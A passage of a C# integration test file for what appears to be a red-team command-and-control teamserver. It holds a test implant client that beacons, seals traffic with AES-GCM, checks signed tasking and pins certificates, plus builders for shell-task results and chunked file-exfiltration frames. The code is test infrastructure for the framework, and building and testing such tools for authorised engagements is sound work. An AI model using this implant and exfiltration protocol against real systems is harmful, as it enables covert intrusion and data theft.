                new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            using var response = await _beacon.PostAsync("/implants/beacon", content);
            response.EnsureSuccessStatusCode();
            return Parse(await response.Content.ReadAsByteArrayAsync());
        }

        /// <summary>
        /// The sealed contact: wraps the handshake (plus upstream frames)
        /// behind a fresh big-endian counter as AES-GCM under the baked key,
        /// posts the base64 body, and opens the sealed response.
        /// </summary>
        public async Task<List<Frame>> SealedContactAsync(IEnumerable<Frame>? upstream = null)
        {
            var frames = new List<Frame> { HandshakeFrame(1, 0) };
            if (upstream is not null)
                frames.AddRange(upstream);
            var body = Seal(frames, ++_counter);
            LastSealedBody = body;
            var response = await _beacon.PostAsync("/implants/beacon", TextBody(body));
            response.EnsureSuccessStatusCode();
            return Parse(Open(await response.Content.ReadAsByteArrayAsync()));
        }

        /// <summary>Posts a previously sealed body verbatim (the replay probe).</summary>
        public async Task<HttpResponseMessage> PostSealedRawAsync(byte[] sealedBody)
            => await _beacon.PostAsync("/implants/beacon", TextBody(sealedBody));

        /// <summary>
        /// The plaintext contact without the success assertion, so a refusal
        /// is an assertable outcome (the downgrade probe).
        /// </summary>
        public async Task<HttpResponseMessage> ContactRawAsync(IEnumerable<Frame>? upstream = null)
        {
            var frames = new List<Frame> { HandshakeFrame(1, 0) };
            if (upstream is not null)
                frames.AddRange(upstream);
            using var content = new ByteArrayContent(Encode(frames));
            content.Headers.ContentType =
                new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            return await _beacon.PostAsync("/implants/beacon", content);
        }

        private static StringContent TextBody(byte[] sealedBody)
            => new(System.Text.Encoding.UTF8.GetString(sealedBody), System.Text.Encoding.UTF8, "text/plain");

        private byte[] Seal(IReadOnlyList<Frame> frames, long counter)
        {
            var encoded = Encode(frames);
            var plaintext = new byte[8 + encoded.Length];
            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plaintext, counter);
            encoded.CopyTo(plaintext, 8);
            var (keyId, key) = Unbake();
            var wrapped = Rod.Transport.Payloads.AesGcmEnvelope.Wrap(
                plaintext, keyId, key, Rod.Transport.Payloads.AesGcmEnvelope.ContactRequestAad);
            return System.Text.Encoding.UTF8.GetBytes(wrapped);
        }

        private byte[] Open(byte[] body)
        {
            var (keyId, key) = Unbake();
            var plaintext = Rod.Transport.Payloads.AesGcmEnvelope.TryUnwrap(
                System.Text.Encoding.UTF8.GetString(body).Trim(), keyId, key,
                Rod.Transport.Payloads.AesGcmEnvelope.ContactResponseAad);
            Assert.NotNull(plaintext);
            return plaintext!;
        }

        private (Guid KeyId, byte[] Key) Unbake()
        {
            Assert.True(Rod.Transport.Payloads.AesGcmEnvelope.TryUnbake(_bakedKey!, out var keyId, out var key));
            return (keyId, key);
        }

        /// <summary>Posts raw bytes, for the framing-refusal assertions.</summary>
        public async Task<HttpResponseMessage> PostRawAsync(byte[] body)
        {
            using var content = new ByteArrayContent(body);
            content.Headers.ContentType =
                new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            return await _beacon.PostAsync("/implants/beacon", content);
        }

        /// <summary>
        /// Tier 1 tasking verification, exactly as the contract doc specifies:
        /// RSASSA-PSS over SHA-256 on the canonical length-prefixed
        /// (implant_id, task_id, verb, arguments) tuple, verified with the
        /// enrolled CA. The implant id in the tuple is the verifier's own.
        /// </summary>
        public bool VerifyTasking(TaskRequest request)
        {
            using var canonical = new MemoryStream();
            foreach (var value in new[] { ImplantId, request.TaskId, request.Verb, request.Arguments })
            {
                var bytes = System.Text.Encoding.UTF8.GetBytes(value);
                canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
                canonical.Write(bytes, 0, bytes.Length);
            }
            var signed = canonical.ToArray();

            foreach (var ca in _cas)
            {
                using var rsa = ca.GetRSAPublicKey();
                if (rsa is null)
                    continue;
                if (rsa.VerifyData(signed, request.Signature.ToByteArray(),
                        HashAlgorithmName.SHA256, RSASignaturePadding.Pss))
                    return true;
            }
            return false;
        }

        public void Dispose() => _beacon.Dispose();

        private Frame HandshakeFrame(int major, int minor, double? sleepSeconds = null, double? jitterSeconds = null)
        {
            var request = new HandshakeRequest
            {
                Version = new ProtocolVersion { Major = major, Minor = minor },
                ImplantId = ImplantId,
                Capabilities = { "shell.exec", "file.pull", "file.push" },
            };
            if (sleepSeconds is { } sleep)
                request.SleepSeconds = sleep;
            if (jitterSeconds is { } jitter)
                request.JitterSeconds = jitter;
            return new Frame { Payload = ByteString.CopyFrom(request.ToByteArray()) };
        }

        // The envelope codec: the protobuf canonical delimited-stream shape --
        // an unsigned varint length before each marshaled Frame.

        private static byte[] Encode(IReadOnlyList<Frame> frames)
        {
            var body = new MemoryStream();
            foreach (var frame in frames)
            {
                var marshaled = frame.ToByteArray();
                WriteVarint(body, marshaled.Length);
                body.Write(marshaled);
            }
            return body.ToArray();
        }

        public static List<Frame> Parse(byte[] body)
        {
            var frames = new List<Frame>();
            var position = 0;
            while (position < body.Length)
            {
                uint length = 0;
                var shift = 0;
                int delimiter;
                for (delimiter = 0; delimiter < 5; delimiter++)
                {
                    var b = body[position + delimiter];
                    length |= (uint)(b & 0x7f) << shift;
                    if ((b & 0x80) == 0)
                        break;
                    shift += 7;
                }
                position += delimiter + 1;
                frames.Add(Frame.Parser.ParseFrom(body, position, (int)length));
                position += (int)length;
            }
            return frames;
        }

        private static void WriteVarint(MemoryStream target, int value)
        {
            uint remaining = (uint)value;
            while (remaining >= 0x80)
            {
                target.WriteByte((byte)(remaining | 0x80));
                remaining >>= 7;
            }
            target.WriteByte((byte)remaining);
        }

        // Accepts the peer certificate iff it chains to one of the pinned CAs
        // (the contract's TLS shape: the teamserver presents the engagement CA
        // itself, carrying no SANs, so the pin is chain-to-CA, not a name).
        private static bool PinServerChain(
            X509Certificate? certificate,
            X509Chain? chain,
            IReadOnlyList<X509Certificate2> pinned)
        {
            if (certificate is not X509Certificate2 || chain is null)
                return false;
            chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
            chain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
            foreach (var ca in pinned)
                chain.ChainPolicy.ExtraStore.Add(ca);
            if (!chain.Build((X509Certificate2)certificate) || chain.ChainElements.Count == 0)
                return false;
            var root = chain.ChainElements[^1].Certificate;
            foreach (var ca in pinned)
                if (root.Thumbprint == ca.Thumbprint)
                    return true;
            return false;
        }
    }

    // The upstream frame builders the from-scratch implant sends after its
    // handshake: a task result, an exfil chunk run, a staged pull.
    private static class ImplantFrames
    {
        public static Frame TaskResult(string taskId, Rod.V1.TaskOutcome outcome, string output)
            => new()
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult
                {
                    TaskId = taskId,
                    Outcome = outcome,
                    Output = output,
                }.ToByteArray()),
            };

        public static IEnumerable<Frame> ExfilChunkRun(string taskId, string name, byte[] content)
        {
            const int chunkSize = 512 * 1024;
            for (var offset = 0; ; offset += chunkSize)
            {
                var end = Math.Min(offset + chunkSize, content.Length);
                var slice = new byte[end - offset];
                Array.Copy(content, offset, slice, 0, slice.Length);
                var terminal = end == content.Length;
                yield return new Frame
                {
                    Kind = FrameKind.ExfilChunk,
                    Payload = ByteString.CopyFrom(new ExfilChunk
                    {
                        TaskId = taskId,
                        Name = name,
                        ContentType = "application/octet-stream",
                        Sequence = (ulong)(offset / chunkSize),
                        Terminal = terminal,
                        Data = ByteString.CopyFrom(slice),
                    }.ToByteArray()),
                };
                if (terminal)
                    yield break;
            }
        }

        // One resumable slice (ADR-010's upload arm): the bytes [from, from +
        // length) of the run, placed at their absolute offset with the
        // declared whole-artifact hash.
        public static Frame ExfilSlice(
            string taskId, string name, byte[] content, int from, int length, bool terminal)
        {
            var slice = new byte[length];
            Array.Copy(content, from, slice, 0, length);
            return new Frame
            {
                Kind = FrameKind.ExfilChunk,
                Payload = ByteString.CopyFrom(new ExfilChunk
                {
                    TaskId = taskId,
                    Name = name,
                    ContentType = "application/octet-stream",
                    Sequence = 0,
                    Terminal = terminal,
                    Offset = (ulong)from,
                    PayloadSha256 = ByteString.CopyFrom(SHA256.HashData(content)),
                    Data = ByteString.CopyFrom(slice),
                }.ToByteArray()),
            };
        }

        // The same byte range as a frame run: 512 KiB frames -- the
        // reference implant's slice size, under the per-frame cap -- with
        // the terminal flag on the range's last frame.
        public static IEnumerable<Frame> ExfilSliceRun(
            string taskId, string name, byte[] content, int from, int length, bool terminal)
        {
            const int frameBytes = 512 * 1024;
            for (var at = from; ; at += frameBytes)
            {
                var take = Math.Min(frameBytes, from + length - at);
                var last = at + take >= from + length;
                yield return ExfilSlice(taskId, name, content, at, take, terminal && last);
                if (last)
                    yield break;
            }
        }

        public static Frame StagedPull(string taskId)
            => new()
            {
                Kind = FrameKind.StagedPull,
                Payload = ByteString.CopyFrom(new StagedPull { TaskId = taskId }.ToByteArray()),
            };
    }

    /// <summary>
    /// A real Kestrel teamserver: the implant endpoint (the WebSocket beacon
    /// and the envelope route both live here) plus the plain-HTTP operator and
    /// enroll API, with a logged-in operator client.
    /// </summary>
    private sealed class TestEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;
        public int HttpPort { get; private set; }
        public string EnrollUrl => $"http://127.0.0.1:{HttpPort}/implants/enroll";

        private string? _engagementId;

        public static async Task<TestEnv> StartAsync()
        {
            var env = new TestEnv();
            env.HttpPort = TestSupport.GetFreeTcpPort();

            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder
                    .ConfigureKestrel(kestrel => kestrel.ListenLocalhost(env.HttpPort)))
                .Build();
            await env.Host.StartAsync();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://127.0.0.1:{env.HttpPort}"),
            };
            await AuthenticatedHost.LoginAsync(env.Http);
            return env;
        }

        /// <summary>
        /// Creates a fresh engagement and mints a deploy token against it,
        /// caching the engagement id the token resolves to.
        /// </summary>
        public async Task<string> MintDeployTokenAsync()
        {
            var engagement = await Http.PostAsJsonAsync("/engagements",
                new { name = "envelope-" + Guid.NewGuid().ToString("N")[..8] });
            engagement.EnsureSuccessStatusCode();
            var created = await engagement.Content.ReadFromJsonAsync<EngagementBody>();
            Assert.NotNull(created);
            _engagementId = created!.EngagementId;

            var minted = await Http.PostAsJsonAsync($"/engagements/{_engagementId}/deploy-tokens", new { });
            minted.EnsureSuccessStatusCode();
            var token = await minted.Content.ReadFromJsonAsync<DeployTokenBody>();
            Assert.NotNull(token);
            return token!.Secret;
        }

        public async Task<(string TaskId, string Verb)> IssueTaskAsync(
            string engagementId, string implantId, string verb, string arguments, byte[]? content = null)
        {
            var issued = await Http.PostAsJsonAsync(
                $"/engagements/{engagementId}/tasks",
                new { ImplantId = implantId, Verb = verb, Arguments = arguments, Content = content });
            issued.EnsureSuccessStatusCode();
            var body = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();
            Assert.NotNull(body);
            return (body!.TaskId, body.Verb);
        }

        public async Task<TaskBody?> GetTaskAsync(string engagementId, string taskId)
            => await Http.GetFromJsonAsync<TaskBody>(
                $"/engagements/{engagementId}/tasks/{taskId}");

        /// <summary>
        /// Creates a fresh engagement in the shape a pipeline build leaves
        /// behind: a deploy token minted for the artifact, a payload record
        /// carrying the token id beside a freshly minted envelope key, and the
        /// baked key the artifact would carry. An enrollment that redeems the
        /// token binds to the key through the record, exactly the way the
        /// build-baked credential binds a real artifact's enrollment.
        /// </summary>
        public async Task<(string EngagementId, string Secret, string BakedKey)> MintSealedArtifactShapeAsync()
        {
            var engagement = await Http.PostAsJsonAsync("/engagements",
                new { name = "sealed-" + Guid.NewGuid().ToString("N")[..8] });
            engagement.EnsureSuccessStatusCode();
            var created = await engagement.Content.ReadFromJsonAsync<EngagementBody>();
            Assert.NotNull(created);
            _engagementId = created!.EngagementId;
            var engagementId = Guid.Parse(_engagementId);

            var engagements = Host.Services.GetRequiredService<Rod.CoreState.Engagements.IEngagementRepository>();
            var owner = (await engagements.FindAsync(new EngagementId(engagementId)))!.OwnerId;

            var (keyId, key) = Rod.Transport.Payloads.AesGcmEnvelope.Mint();
            var tokens = Host.Services.GetRequiredService<Rod.CoreState.Deployment.IDeployTokenService>();
            var token = await tokens.MintAsync(
                new EngagementId(engagementId), owner, DateTimeOffset.UtcNow, 1, TimeSpan.FromHours(1));

            var payloads = Host.Services.GetRequiredService<IPayloadStore>();
            await payloads.SaveAsync(new PayloadRecord(
                Guid.NewGuid(), engagementId, "Implant", "DotNet", "application/octet-stream",
                new string('a', 64), Array.Empty<byte>(), 0, DateTimeOffset.UtcNow,
                TokenId: token.Id.Value, EnvelopeKeyId: keyId, EnvelopeKey: key));

            return (_engagementId, token.Secret, Rod.Transport.Payloads.AesGcmEnvelope.Bake(keyId, key));
        }

        public async ValueTask DisposeAsync()
        {
            Http?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }
    }

    // Minimal DTOs for the operator JSON round-trips; the transport owns the
    // wire shape.

    private sealed class EngagementBody
    {
        public string EngagementId { get; set; } = "";
    }

    private sealed class DeployTokenBody
    {
        public string Secret { get; set; } = "";
    }

    private sealed class TaskIssuedBody
    {
        public string TaskId { get; set; } = "";
        public string Verb { get; set; } = "";
    }

    private sealed class TaskBody
    {
        public string Status { get; set; } = "";
        public string? Output { get; set; }
        public string? Outcome { get; set; }
        public AuditBody[] Audit { get; set; } = Array.Empty<AuditBody>();
    }

    private sealed class AuditBody
    {
        public string Kind { get; set; } = "";
    }
}
